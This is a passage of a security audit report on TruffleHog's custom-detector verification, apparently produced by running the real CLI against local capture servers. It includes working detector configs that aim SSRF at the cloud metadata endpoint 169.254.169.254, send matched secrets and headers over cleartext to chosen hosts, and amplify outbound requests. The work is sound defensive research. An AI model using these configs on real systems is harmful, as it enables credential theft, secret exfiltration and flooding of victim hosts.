# TruffleHog Custom-Detector Verification — Security Due-Diligence Investigation

**Branch:** `trufflehog_e42153d44a5e` · **Subject:** the custom-detector *verification* feature and its abuse surface when detector configurations come from a party that is not fully trusted.

## TL;DR (bottom line)

A party who controls a custom-detector configuration controls an **outbound HTTP client** — its destination host, its URL scheme, and its request headers — and **receives the matched secrets** in the request body. The verification feature performs **no destination-host validation** (Server-Side Request Forgery is possible, including to the cloud metadata endpoint `169.254.169.254`), verifies **one request per match-permutation** (capped at 100 *per chunk*, with **no global cap** and **unbounded concurrency**), and transmits the **raw detected secret(s)** plus any attacker-chosen headers to that endpoint. HTTPS endpoints do get full, default Go certificate verification (so a forged-cert MITM over HTTPS is rejected), but a config author can trivially downgrade to cleartext with `unsafe: true`, and there is **no certificate pinning**. The one place the design is safe by construction is regex execution: Go's RE2 engine guarantees linear-time matching, so a malicious regex is **not** a denial-of-service vector. **Overall: yes — a party controlling a detector config can abuse the verification system in ways an operator likely has not anticipated. The trust boundary "a detector config is just patterns" is false; untrusted detector configs must be treated as untrusted code.**

Every claim below is backed by (a) the exact command run against the canonically-built binary, (b) the actual, unedited output, (c) a `file:line` citation naming the responsible function/struct, and (d) causal reasoning. The six questions are answered by name in sections Q1–Q6, and a coverage pass at the end confirms every named item is addressed.

---

## Environment & canonical build

The investigation exercised the **real CLI** (`./trufflehog filesystem --config=<detector>.yml <targetdir>`), not `go test` or any unit-test double. Every experiment traverses the genuine config load path `config.Read` → `NewYAML` → `protoyaml.UnmarshalStrict` → `custom_detectors.NewWebhookCustomRegex` (`pkg/config/config.go:L18,L27,L30,L36`) and the genuine scan/verify path.

| Item | Value | Source |
|------|-------|--------|
| Branch | `trufflehog_e42153d44a5e` (source branch that names this document) | `git branch --show-current` |
| Go toolchain | `go version go1.24.2 linux/amd64` | `go.mod:L4` `toolchain go1.24.2`; CI pins `go-version: "1.24"` |
| Build (canonical) | `CGO_ENABLED=0 go build -o trufflehog .` | `Dockerfile:L5` `ENV CGO_ENABLED=0` + `Dockerfile:L9` `... go build -o trufflehog .` |
| Version | `trufflehog dev` | `./trufflehog --version` |
| Invocation (canonical) | `./trufflehog filesystem --config=<detector>.yml <targetdir>` | `examples/README.md:L10`; `main.go:L143-144` (`filesystem`), `main.go:L70` (`--config`) |

**Canonical build, recorded verbatim:**

```
$ CGO_ENABLED=0 go build -o trufflehog .
$ ./trufflehog --version
trufflehog dev
```

The `trufflehog` binary is `.gitignore`'d (`.gitignore` line 7 = `trufflehog`), so building it does **not** dirty the repository — `git status --porcelain` is empty before and after the build.

**Standard user flags used on every run:** `--no-update --no-color` (so the captured output is genuinely unedited, with zero ANSI escapes). These are ordinary user flags; the *build* itself is the default/canonical configuration. Where a machine-readable summary was needed, `--json` was added; where verification had to be suppressed, `--no-verification` was added. Each such flag is shown in the command it accompanies.

> **Grounding note (build citation).** The AAP shorthand cites the build as `Dockerfile:L7`. On this branch the `RUN` directive spans `Dockerfile:L7-L9` (with `--mount=type=cache` lines); the literal build pieces are `L5` (`ENV CGO_ENABLED=0`) and `L9` (`go build -o trufflehog .`). The build **command** is canonical and accurate; only the exact line anchor is refined here.

---

## Methodology / observation harness

Per the investigation rules, behavior was **observed by running the code first**, then written up. All temporary scripts, detector configs, target files, certificates, and capture servers were created **outside the repository** in `/tmp/thog_lab` and deleted afterward (see Cleanup confirmation). All secrets used are **synthetic**; all capture servers bind to **localhost** (the single exception, `169.254.169.254` in Q1, is an ephemeral loopback-alias network setting, not a repository artifact).

**Cleartext / TLS capture server** (Python `http.server`, threaded so it absorbs TruffleHog's unbounded verification concurrency; adapted from the verification-server example in `pkg/custom_detectors/CUSTOM_DETECTORS.md:L95-L209`). It is env-configurable: `CS_HOST`, `CS_PORT`, `CS_STATUS` (status code to return), `CS_MODE` (`dump` logs `METHOD`/`PATH`/`HEADERS`/`BODY`; `count` tallies requests), `CS_LOG`, and optional `CS_CERT`+`CS_KEY` (to TLS-wrap the socket for the HTTPS experiment). Its listen backlog was raised (`request_queue_size = 1024`) after an early observation that the default backlog of 5 dropped connections under ~100 concurrent POSTs (see Q3 for the full, transparent account).

**Self-signed certificate** for the HTTPS experiment (Q2):

```
$ openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 2 \
    -subj "/CN=localhost" -addext "subjectAltName=DNS:localhost,IP:127.0.0.1"
```

**Smoke test (proves the harness + the real load/scan/verify path work end-to-end)** using the canonical `HogTokenDetector` example from `CUSTOM_DETECTORS.md` (keyword `hog`, regex `token`, endpoint `http://127.0.0.1:8000/` with `unsafe: true`, one `Authorization` header; server returns HTTP 200):

```
$ ./trufflehog filesystem --config=/tmp/thog_lab/smoke.yml --no-update --no-color /tmp/thog_lab/smoke_target
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2026-07-08T04:51:19Z	info-0	trufflehog	running source	{"source_manager_worker_id": "5X6Pe", "with_units": true}
✅ Found verified result 🐷🔑
Detector Type: CustomRegex
Decoder Type: PLAIN
Raw result: pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn
Response: ok
Name: HogTokenDetector
File: /tmp/thog_lab/smoke_target/creds.txt
Line: 1

2026-07-08T04:51:19Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 52, "verified_secrets": 1, "unverified_secrets": 0, "scan_duration": "6.45848ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":1}}
```

The capture server received:

```
===== REQUEST #1 =====
  METHOD: POST
  PATH: /
  HEADERS:
    Host: 127.0.0.1:8000
    User-Agent: TruffleHog
    Content-Length: 121
    Authorization: super secret authorization header
    Accept-Encoding: gzip
  BODY: {"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}
```

This confirms the full genuine path fires: the config loads, the scan matches, and a real verification `POST` is issued carrying the secret. The body array is `[fullMatch, captureGroup]` — the first element includes the regex's boundary characters (leading space, trailing newline), the second is the clean capture group.

---

## Q1 — SSRF / endpoint-host validation

> *"If someone submits a detector configuration pointing to an internal address or a cloud metadata endpoint, what actually happens?"*

**Direct answer.** There is **no destination-host validation whatsoever**. A detector config may point `verify.endpoint` at any host — an internal/private address or the cloud metadata endpoint `169.254.169.254` — and TruffleHog issues the verification `POST` to it. This is a working Server-Side Request Forgery (SSRF) primitive. The only checks performed at config load are: (1) the endpoint must be non-empty, and (2) an `http://` endpoint must set `unsafe: true`. There is **no** allow/deny-list, and **no** private-IP / link-local / metadata block.

**Code citation.** `ValidateVerifyEndpoint` (`pkg/custom_detectors/validation.go:L35-L44`) is the *entire* endpoint gate:

```go
func ValidateVerifyEndpoint(endpoint string, unsafe bool) error {
	if endpoint == "" {
		return fmt.Errorf("no endpoint")
	}
	if strings.HasPrefix(endpoint, "http://") && !unsafe {
		return fmt.Errorf("http endpoint must have unsafe=true")
	}
	return nil
}
```

The request itself is built against the **raw** endpoint string in `CustomRegexWebhook.createResults` (`pkg/custom_detectors/custom_detectors.go:L228`): `req, err := http.NewRequestWithContext(ctx, "POST", verifyConfig.GetEndpoint(), bytes.NewReader(body))`. No host inspection happens anywhere between load and dial.

### E1a — internal loopback with a metadata-style path

The endpoint targets a loopback address with the AWS instance-metadata credential path; the target file holds a synthetic secret.

```
$ cat e1a_internal.yml
detectors:
  - name: SSRFDetector
    keywords: [hog]
    regex:
      token: 'hog token: ([A-Za-z0-9]+)'
    verify:
      - endpoint: http://127.0.0.1:8001/latest/meta-data/iam/security-credentials/
        unsafe: true

$ ./trufflehog filesystem --config=e1a_internal.yml --no-update --no-color target_ssrf
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2026-07-08T04:53:06Z	info-0	trufflehog	running source	{"source_manager_worker_id": "P2XyS", "with_units": true}
✅ Found verified result 🐷🔑
Detector Type: CustomRegex
Decoder Type: PLAIN
Raw result: AKIAIOSFODNN7EXAMPLEZ1234567890abcdEXAMPLE
Response: ok
Name: SSRFDetector
File: /tmp/thog_lab/e1/target_ssrf/creds.txt
Line: 1

2026-07-08T04:53:06Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 54, "verified_secrets": 1, "unverified_secrets": 0, "scan_duration": "6.285419ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":1}}
```

The capture server bound on `127.0.0.1:8001` received the request verbatim:

```
===== REQUEST #1 =====
  METHOD: POST
  PATH: /latest/meta-data/iam/security-credentials/
  HEADERS:
    Host: 127.0.0.1:8001
    User-Agent: TruffleHog
    Content-Length: 129
    Accept-Encoding: gzip
  BODY: {"SSRFDetector":{"token":["hog token: AKIAIOSFODNN7EXAMPLEZ1234567890abcdEXAMPLE","AKIAIOSFODNN7EXAMPLEZ1234567890abcdEXAMPLE"]}}
```

The attacker-chosen host **and path** were honored exactly, and the secret was delivered in the body.

### E1b — the real cloud-metadata address `169.254.169.254`

Because `ip`/`ifconfig` were unavailable in the container, `169.254.169.254` was bound to a loopback alias (`lo:9`) via a Python `ioctl(SIOCSIFADDR=0x8916)` call (confirmed present in `/proc/net/fib_trie`). This is an ephemeral, non-repository network setting, removed at cleanup. The capture server was then bound on `169.254.169.254:80`.

```
$ cat e1b_metadata.yml
detectors:
  - name: MetadataSSRF
    keywords: [hog]
    regex:
      token: 'hog token: ([A-Za-z0-9]+)'
    verify:
      - endpoint: http://169.254.169.254/latest/meta-data/iam/security-credentials/
        unsafe: true

$ ./trufflehog filesystem --config=e1b_metadata.yml --no-update --no-color target_ssrf
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2026-07-08T04:53:52Z	info-0	trufflehog	running source	{"source_manager_worker_id": "JnXtI", "with_units": true}
✅ Found verified result 🐷🔑
Detector Type: CustomRegex
Decoder Type: PLAIN
Raw result: AKIAIOSFODNN7EXAMPLEZ1234567890abcdEXAMPLE
Response: ok
Name: MetadataSSRF
File: /tmp/thog_lab/e1/target_ssrf/creds.txt
Line: 1

2026-07-08T04:53:52Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 54, "verified_secrets": 1, "unverified_secrets": 0, "scan_duration": "5.972185ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":1}}
```

The capture server bound **on `169.254.169.254:80`** received:

```
===== REQUEST #1 =====
  METHOD: POST
  PATH: /latest/meta-data/iam/security-credentials/
  HEADERS:
    Host: 169.254.169.254
    User-Agent: TruffleHog
    Content-Length: 129
    Accept-Encoding: gzip
  BODY: {"MetadataSSRF":{"token":["hog token: AKIAIOSFODNN7EXAMPLEZ1234567890abcdEXAMPLE","AKIAIOSFODNN7EXAMPLEZ1234567890abcdEXAMPLE"]}}
```

TruffleHog literally dialed the AWS link-local metadata IP with the attacker-chosen credential path. In a real cloud/CI environment where a metadata service answers on that IP, this is a direct credential-theft pivot.

### E1c — full characterization of `ValidateVerifyEndpoint` (the only endpoint checks)

Three real runs exhaustively exercise the gate:

```
$ # (1) empty endpoint
$ ./trufflehog filesystem --config=e1c_empty.yml --no-update --no-color target_ssrf
2026-07-08T04:54:11Z	error	trufflehog	error parsing the provided configuration file	{"error": "no endpoint"}

$ # (2) http://169.254.169.254/... WITHOUT unsafe
$ ./trufflehog filesystem --config=e1c_httpnounsafe.yml --no-update --no-color target_ssrf
2026-07-08T04:54:13Z	error	trufflehog	error parsing the provided configuration file	{"error": "http endpoint must have unsafe=true"}

$ # (3) https://169.254.169.254/... (no unsafe needed)
$ ./trufflehog filesystem --config=e1c_httpsmeta.yml --no-update --no-color target_ssrf
Found unverified result 🐷🔑❓
```

Case (2) is the crucial one: the request is rejected **because of the http/unsafe rule, not because of the host**. Case (3) proves the metadata host is **not** rejected — the config loads and the scan runs (the result is merely `unverified` here because no TLS listener was standing on that IP, not because of any host validation).

**Reasoning / nuance.** The natural operator assumption — *"there would be validation preventing this"* — is **not** borne out. `ValidateVerifyEndpoint` (`pkg/custom_detectors/validation.go:L35-L44`) never inspects the host; the raw endpoint flows straight into `http.NewRequestWithContext(... "POST", verifyConfig.GetEndpoint() ...)` (`pkg/custom_detectors/custom_detectors.go:L228`). TruffleHog frequently runs in CI/CD with attached cloud IAM roles, so an attacker-supplied detector config becomes an SSRF pivot to `169.254.169.254` (or any internal service) for credential theft or internal reconnaissance.

---


## Q2 — TLS certificate validation & MITM

> *"When verification requests are made over HTTPS, what certificate validation does TruffleHog perform? If someone is sitting on the network path, could they intercept the traffic?"*

**Direct answer.** For an `https://` endpoint, TruffleHog performs **full, default Go certificate verification** (`crypto/tls.Config.InsecureSkipVerify` defaults to `false`, so the certificate chain **and** hostname are checked). A self-signed / untrusted certificate makes the TLS handshake fail and the secret is **never sent** — so a network attacker presenting a forged certificate over HTTPS is rejected. **However**, two important caveats: (a) the config author can choose `http://` + `unsafe: true`, forcing **cleartext** so the secret and headers travel in the clear and are trivially interceptable/alterable by any on-path attacker; and (b) custom-detector verification uses **no certificate pinning** — trust rests entirely on the system CA store.

**Code citation.** Custom detectors verify through the package-level client `var httpClient = common.SaneHttpClient()` (`pkg/custom_detectors/custom_detectors.go:L62`). `SaneHttpClient` (`pkg/common/http.go:L223-L228`) builds its transport from `saneTransport`, which sets timeouts and connection pooling but **no `TLSClientConfig`** (`pkg/common/http.go:L211-L221`) — so Go's default certificate verification applies. Certificate pinning exists **only** in `PinnedRetryableHttpClient` (`pkg/common/http.go:L159-L178`), which sets `TLSClientConfig: &tls.Config{RootCAs: PinnedCertPool()}` and which custom detectors do **not** use.

### E2a — HTTPS self-signed, controlled cross-product (proves default verification is ON)

The **only** variable changed between the two runs is whether the self-signed certificate is trusted (via `SSL_CERT_FILE`). Everything else — endpoint, config, target — is identical.

**(i) Default trust store** — the self-signed cert is untrusted:

```
$ ./trufflehog filesystem --config=e2a_https.yml --no-update --no-color /tmp/thog_lab/e1/target_ssrf
Found unverified result 🐷🔑❓
finished scanning	{"chunks": 1, "bytes": 54, "verified_secrets": 0, "unverified_secrets": 1, "scan_duration": "15.482495ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":10}}
```

Capture-server log **after (i)** — empty; the handshake was rejected client-side and the body was never transmitted:

```
[[EMPTY — handshake rejected, body never sent]]
```

**(ii) Same server, `SSL_CERT_FILE=cert.pem`** — now the self-signed cert is trusted:

```
$ SSL_CERT_FILE=/tmp/thog_lab/cert.pem ./trufflehog filesystem --config=e2a_https.yml --no-update --no-color /tmp/thog_lab/e1/target_ssrf
✅ Found verified result 🐷🔑
finished scanning	{"chunks": 1, "bytes": 54, "verified_secrets": 1, "unverified_secrets": 0, "scan_duration": "13.930366ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":8}}
```

Capture-server log **after (ii)** — the POST now arrives (the body is delivered only once the certificate is trusted):

```
===== REQUEST #1 =====
  METHOD: POST
  PATH: /verify
  HEADERS:
    Host: 127.0.0.1:8443
    User-Agent: TruffleHog
    Content-Length: 128
    Accept-Encoding: gzip
  BODY: {"TLSDetector":{"token":["hog token: AKIAIOSFODNN7EXAMPLEZ1234567890abcdEXAMPLE","AKIAIOSFODNN7EXAMPLEZ1234567890abcdEXAMPLE"]}}
```

Because the sole difference was certificate trust (`verified_secrets` went `0 → 1`), TruffleHog demonstrably validates the certificate chain and hostname by default.

**(iii) `curl` corroboration** against the *same* self-signed server:

```
$ curl -s -X POST "https://127.0.0.1:8443/verify" --data 'x'
curl-default-exit=60
$ curl -s --cacert /tmp/thog_lab/cert.pem -X POST "https://127.0.0.1:8443/verify" --data 'x'
ok
 curl-cacert-exit=0
```

`curl` exit code `60` is "SSL certificate problem"; adding `--cacert` to trust the cert yields `ok`. This mirrors TruffleHog's behavior exactly.

### E2b — `http://` + `unsafe: true` → cleartext MITM exposure

```
$ cat e2b_cleartext.yml
detectors:
  - name: CleartextDetector
    keywords: [hog]
    regex:
      token: 'hog token: ([A-Za-z0-9]+)'
    verify:
      - endpoint: http://127.0.0.1:8002/verify
        unsafe: true
        headers:
          - "Authorization: Bearer SYNTHETIC-MITM-TOKEN-abc123"

$ ./trufflehog filesystem --config=e2b_cleartext.yml --no-update --no-color /tmp/thog_lab/e1/target_ssrf
✅ Found verified result 🐷🔑
```

The capture server received everything **in plaintext** — secret and authorization header fully visible (and alterable) to any on-path attacker:

```
===== REQUEST #1 =====
  METHOD: POST
  PATH: /verify
  HEADERS:
    Host: 127.0.0.1:8002
    User-Agent: TruffleHog
    Content-Length: 134
    Authorization: Bearer SYNTHETIC-MITM-TOKEN-abc123
    Accept-Encoding: gzip
  BODY: {"CleartextDetector":{"token":["hog token: AKIAIOSFODNN7EXAMPLEZ1234567890abcdEXAMPLE","AKIAIOSFODNN7EXAMPLEZ1234567890abcdEXAMPLE"]}}
```

### E2c — `http://` without `unsafe` → rejected at load

```
$ ./trufflehog filesystem --config=e2c_httpnounsafe.yml --no-update --no-color /tmp/thog_lab/e1/target_ssrf
2026-07-08T04:56:25Z	error	trufflehog	error parsing the provided configuration file	{"error": "http endpoint must have unsafe=true"}
```

**Reasoning / nuance.** Against a *forged-certificate* MITM over HTTPS, TruffleHog is safe by default — that is the good news, and it is a direct consequence of `saneTransport` leaving `TLSClientConfig` unset (`pkg/common/http.go:L211-L221`) so Go's default verification applies. But a **MITM is still viable** two ways: (a) if the config author selects `http://` + `unsafe: true`, the traffic is cleartext (E2b); and (b) because there is **no pinning** (pinning lives only in the unused `PinnedRetryableHttpClient`, `pkg/common/http.go:L159-L178`), any certificate chaining to a CA in the system trust store — including an operator-added corporate CA or a rogue CA installed on the host — is accepted. So the honest answer to *"could someone on the network path intercept the traffic?"* is: **not by forging a cert against an HTTPS endpoint, but yes if the config uses `unsafe` cleartext, and yes if the attacker can get a cert trusted by the host's CA store.**

---


## Q3 — Verification behavior under multiple matches & request limits

> *"How does verification work when a detector has multiple matching patterns in the same file? Does it verify once, or does something more complex happen? If it's more complex, is there any limit on how many requests can be triggered?"*

**Direct answer.** It does **not** verify once. It verifies **once per permutation** — the cartesian product of each named regex's matches — and each permutation is POSTed in its **own goroutine** through an `errgroup.Group` created with **no concurrency limit**. The product is capped at `maxTotalMatches = 100`, but that cap applies **per chunk** (per `FromData` call), so there is **no global cap**: a large input is split into many chunks and each chunk can independently emit up to 100 verification requests. In short: many matches → up to 100 concurrent POSTs *per chunk* → total requests scale roughly with `#chunks × up to 100`.

**Code citation.**
- Per-match permutation: `permutateMatches` (`pkg/custom_detectors/custom_detectors.go:L110`, product built in `productIndices` `L287-L310`, assembled `L317-L343`).
- The cap: `const maxTotalMatches = 100` (`pkg/custom_detectors/custom_detectors.go:L23`), enforced inside `productIndices` (`L295-L297`: `if count > maxTotalMatches { break }`).
- Unbounded concurrency: `g := new(errgroup.Group)` (`pkg/custom_detectors/custom_detectors.go:L112`) with `g.Go(...)` per permutation (`L155-L158`) and **no** `g.SetLimit(...)` anywhere in the file (verified by `grep -n "SetLimit"` returning nothing).

### Run scale, stability, and a transparent instrument correction

Run scale: **5, 150, and 600 matches** (single-regex, distinct 40-char synthetic tokens so nothing is deduplicated), plus a **2×3** two-regex case; each count was confirmed **stable across ≥2 runs**.

**An early inconsistency — and its true cause.** The first 150-match runs reported `POSTs=63` then `POSTs=56` — neither 100 nor stable. Per the run-first rules I did not hide this behind a controlled variant; I ran the unchanged input again with full output:

```
$ ./trufflehog filesystem --config=e3.yml --no-update --no-color t150   # (counting server)
finished scanning	{"chunks": 1, "bytes": 7800, "verified_secrets": 62, "unverified_secrets": 38, "scan_duration": "5.019226192s", ...}
POSTs received=62
```

The summary shows `verified_secrets: 62 + unverified_secrets: 38 = 100` **total** — so the `maxTotalMatches = 100` cap *was* already working. Only 62 *verified* because 38 POSTs were **dropped by the capture server's default listen backlog** (Python `socketserver.TCPServer.request_queue_size = 5`) under ~100 simultaneous connections; those 38 then hit TruffleHog's **5 s HTTP-client timeout** (note `scan_duration: 5.019226192s`). This was an **instrument** limitation, not TruffleHog behavior. Raising the server backlog to `request_queue_size = 1024` removed the drops and produced the true, stable result below.

### E3a — one request per match; the 100 cap (single chunk, stable ×2)

```
[5-matches   run1] POSTs=5   ; "verified_secrets": 5,   "unverified_secrets": 0
[5-matches   run2] POSTs=5   ; "verified_secrets": 5,   "unverified_secrets": 0
[150-matches run1] POSTs=100 ; "verified_secrets": 100, "unverified_secrets": 0
[150-matches run2] POSTs=100 ; "verified_secrets": 100, "unverified_secrets": 0
```

5 matches → 5 POSTs; 150 matches → exactly **100** POSTs (the cap). Both stable.

### E3b — the cap is PER-CHUNK, not global (stable ×2)

The target holds 600 distinct matches (31,200 bytes), which spans multiple chunks (`ChunkSize = 10 * 1024` and `PeekSize = 3 * 1024`, `pkg/sources/chunker.go:L14,L16`):

```
[600-matches run1] total POSTs=309 ; "chunks": 4, "bytes": 37824, "verified_secrets": 309, "unverified_secrets": 0
[600-matches run2] total POSTs=309 ; "chunks": 4, "bytes": 37824, "verified_secrets": 309, "unverified_secrets": 0
```

**309 > 100** — decisive proof that the 100 cap applies **per chunk** (per `FromData` call), not globally. Four chunks yielded 309 verification requests. (The `"bytes": 37824` reflects the overlapping peek regions the chunker adds; the underlying file is 31,200 bytes.)

### E3c — the "something more complex" is a cartesian product

Two named regexes, `alpha` (2 matches) and `beta` (3 matches):

```
$ ./trufflehog filesystem --config=e3c_perm.yml --no-update --no-color tperm
"verified_secrets": 6, "unverified_secrets": 0
Total POSTs (expect 2*3=6): 6
```

The six captured bodies are each a unique `alpha × beta` pairing — the full cartesian product:

```
  BODY: {"PermDetector":{"alpha":["alpha-AAAA0001","AAAA0001"],"beta":["beta-BBBB0001","BBBB0001"]}}
  BODY: {"PermDetector":{"alpha":["alpha-AAAA0001","AAAA0001"],"beta":["beta-BBBB0002","BBBB0002"]}}
  BODY: {"PermDetector":{"alpha":["alpha-AAAA0001","AAAA0001"],"beta":["beta-BBBB0003","BBBB0003"]}}
  BODY: {"PermDetector":{"alpha":["alpha-AAAA0002","AAAA0002"],"beta":["beta-BBBB0001","BBBB0001"]}}
  BODY: {"PermDetector":{"alpha":["alpha-AAAA0002","AAAA0002"],"beta":["beta-BBBB0002","BBBB0002"]}}
  BODY: {"PermDetector":{"alpha":["alpha-AAAA0002","AAAA0002"],"beta":["beta-BBBB0003","BBBB0003"]}}
```

**Reasoning / nuance.** Combined with Q1 (arbitrary destination) and Q4 (the body carries the real secret), the per-chunk cap plus unbounded concurrency plus no global cap is a **traffic-amplification / DoS** primitive: a config author can craft an input that produces `#chunks × up to 100` outbound requests, fired in unbounded-concurrency bursts of up to 100 simultaneous connections per chunk, against any victim host they choose. Run scale used: 5 / 150 / 600 matches (single-regex) and 2×3 (two-regex); counts (5, 100, 309, 6) were stable across the repeated runs shown above.

---


## Q4 — Webhook request contents

> *"When the verification webhook is called, what data gets sent to the endpoint?"*

**Direct answer.** Each verification is a `POST` to the **raw** `verify.endpoint` (path and query string preserved), carrying:
- `User-Agent: TruffleHog` — injected by the shared transport (`pkg/common/http.go:L100`, value from `UserAgent()` `L92-L97`);
- **every** user-supplied `verify.headers` entry, added by splitting on the **first** `:` only (`strings.Cut`, `pkg/custom_detectors/custom_detectors.go:L232-L239`);
- `Accept-Encoding: gzip` and `Content-Length` (added by Go's `net/http`);
- a JSON body of the form `{detectorName: {regexName: [fullMatch, captureGroup, ...]}}` (`json.Marshal`, `pkg/custom_detectors/custom_detectors.go:L213-L216`).

Verification is treated as successful **only** when the response status is exactly HTTP `200` (`pkg/custom_detectors/custom_detectors.go:L249`, `if resp.StatusCode == http.StatusOK`); the proto's `successRanges` field is **not** consulted.

### E4a — full request dump (two user headers + a query string)

The config sets two headers (one whose value contains extra colons) and a query string; the target token is exactly 40 characters.

```
$ cat e4a.yml
detectors:
  - name: WebhookContents
    keywords: [hog]
    regex:
      token: 'hog token: ([A-Za-z0-9]+)'
    verify:
      - endpoint: http://127.0.0.1:8006/collect?probe=1
        unsafe: true
        headers:
          - "Authorization: Bearer SYNTH-TOKEN-xyz:with:colons"
          - "X-Custom-Header: custom-value"

$ ./trufflehog filesystem --config=e4a.yml --no-update --no-color /tmp/thog_lab/e4/target
✅ Found verified result 🐷🔑
Response: ok
```

The capture server received, verbatim:

```
===== REQUEST #1 =====
  METHOD: POST
  PATH: /collect?probe=1
  HEADERS:
    Host: 127.0.0.1:8006
    User-Agent: TruffleHog
    Content-Length: 128
    Authorization: Bearer SYNTH-TOKEN-xyz:with:colons
    X-Custom-Header: custom-value
    Accept-Encoding: gzip
  BODY: {"WebhookContents":{"token":["hog token: AKIA000000000000000000000000000000000042","AKIA000000000000000000000000000000000042"]}}
```

Two byte-sensitive details confirmed by the exact emitted bytes:
1. The `Authorization` value **retains** `:with:colons` — proving the header is split on the **first** colon only (`strings.Cut(header, ":")`, `pkg/custom_detectors/custom_detectors.go:L232-L239`), not on every colon.
2. The body's array is `[fullMatch, captureGroup]`: `"hog token: AKIA…042"` (the whole regex match) followed by `"AKIA…042"` (capture group 1).

The response body (`ok`) is captured into the result's `ExtraData["response"]`, truncated to 200 characters (`pkg/custom_detectors/custom_detectors.go:L259-L266`) — visible as `Response: ok` in the CLI output.

### E4b — only HTTP 200 verifies (status cross-product)

```
server returns HTTP 200  =>  VERIFIED
server returns HTTP 401  =>  UNVERIFIED
server returns HTTP 403  =>  UNVERIFIED
server returns HTTP 500  =>  UNVERIFIED
```

This confirms `if resp.StatusCode == http.StatusOK` (`pkg/custom_detectors/custom_detectors.go:L249`) is the sole success criterion.

### E4c — `successRanges` is accepted but IGNORED (defined-but-unwired)

The proto schema does define a `successRanges` field (`proto/custom_detectors.proto` field 4; generated struct `SuccessRanges []string \`… json:"successRanges,omitempty"\``). A config that sets it loads without a strict-unmarshal error, yet it has no effect:

```
$ cat e4c_ranges.yml   # verify: successRanges: ["201","200-299"]
$ # capture server configured to return HTTP 201
$ ./trufflehog filesystem --config=e4c_ranges.yml --no-update --no-color /tmp/thog_lab/e4/target
Found unverified result 🐷🔑❓
POSTs received (server was hit)=1
```

The endpoint **was** hit (`POSTs received = 1`), the server returned `201`, and the config author asked (via `successRanges`) for `201` to count as success — yet the result is `unverified`. The reason is in the constructor: `NewWebhookCustomRegex` (`pkg/custom_detectors/custom_detectors.go:L40-L60`) validates only keywords, regex, endpoint, and headers:

```go
func NewWebhookCustomRegex(pb *custom_detectorspb.CustomRegex) (*CustomRegexWebhook, error) {
	// TODO: Return all validation errors.
	if err := ValidateKeywords(pb.Keywords); err != nil {
		return nil, err
	}
	if err := ValidateRegex(pb.Regex); err != nil {
		return nil, err
	}

	for _, verify := range pb.Verify {
		if err := ValidateVerifyEndpoint(verify.Endpoint, verify.Unsafe); err != nil {
			return nil, err
		}
		if err := ValidateVerifyHeaders(verify.Headers); err != nil {
			return nil, err
		}
	}

	// TODO: Copy only necessary data out of pb.
	return &CustomRegexWebhook{pb}, nil
}
```

`ValidateVerifyRanges` (`pkg/custom_detectors/validation.go:L55-L97`) — the function that would parse and honor `successRanges` — is **defined but never called** here (as is `ValidateRegexVars`, `validation.go:L99-L108`). So the field is silently inert, and verification remains hard-wired to HTTP 200.

**Reasoning / nuance.** The data sent to the (attacker-chosen, per Q1) endpoint is the **raw detected secret(s)** plus whatever headers the config author chose. A malicious config whose regex matches real organizational secrets therefore **exfiltrates them** to the attacker's host under the guise of "verification." Separately, `successRanges` is an operator-expectation trap: an operator who writes `successRanges: ["200-299"]` will get behavior that silently diverges from the config, because only `200` is ever treated as verified.

---


## Q5 — Regex handling & ReDoS safeguards

> *"If someone provides a complex regex pattern, how does TruffleHog handle it? Are there any safeguards around regex execution?"*

**Direct answer.** Custom-detector patterns are compiled with Go's standard `regexp` package — the **RE2** engine — in `ValidateRegex` at config load (`pkg/custom_detectors/validation.go:L23-L33`, `regexp.Compile`) and again during scanning in `FromData` (`pkg/custom_detectors/custom_detectors.go:L91-L97`). RE2 guarantees **linear-time** matching and supports **no backreferences**, so it is structurally immune to the catastrophic-backtracking that causes Regular-Expression Denial of Service (ReDoS). There is **no explicit pattern length/complexity cap** in TruffleHog's own code, but three bounds exist: RE2's linear-time guarantee itself; the matched-secret size cap `MaxSecretSize = 1000` (`pkg/custom_detectors/custom_detectors.go:L180-L182`); and a per-detector, per-chunk **scan timeout backstop** (see the timeout note below).

### E5a — pathological `(a+)+$` via the real CLI (stable ×3)

Input = 200,000 `a` followed by `!` (200,001 bytes); regex `redos: '(a+)+$'`; keyword `a`; no verification. On a *backtracking* engine this pattern is catastrophic; on RE2 it is linear.

```
$ ./trufflehog filesystem --config=e5a.yml --no-update --no-color --no-verification /tmp/thog_lab/e5/target
run1: wall=1.828s ; "scan_duration": "30.815324ms" ; "chunks": 20
run2: wall=1.800s ; "scan_duration": "27.473545ms" ; "chunks": 20
run3: wall=1.805s ; "scan_duration": "26.809656ms" ; "chunks": 20
```

Full `finished scanning` line (run 1), showing the scan genuinely ran:

```
2026-07-08T05:02:02Z	info-0	trufflehog	finished scanning	{"chunks": 20, "bytes": 258369, "verified_secrets": 0, "unverified_secrets": 19, "scan_duration": "30.815324ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":0,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":0}}
```

